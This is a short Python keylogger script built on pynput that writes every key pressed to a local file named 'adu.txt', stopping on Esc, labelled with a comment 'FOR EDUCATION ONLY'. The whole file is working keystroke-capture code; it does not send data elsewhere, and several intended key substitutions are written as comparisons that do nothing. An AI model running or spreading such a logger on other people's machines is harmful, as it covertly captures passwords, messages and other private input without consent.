from pynput.keyboard import Listener


#FOR EDUCATION ONLY


def anoymous(key) :
    key=str(key)
    key=key.replace("'","")
    if key == "Key.esc" : 
        raise SystemExit(0)
    if key == "Key.enter" :
        key == "\n" 
    if key == "Key.alt_l" :
        key == "\n"  
    if key == "Key.tab" :
        key == "\n"

    with open( "adu.txt" ,"a") as file :
        file.write(key) 
with Listener(on_press=anoymous) as listener :
    listener.join()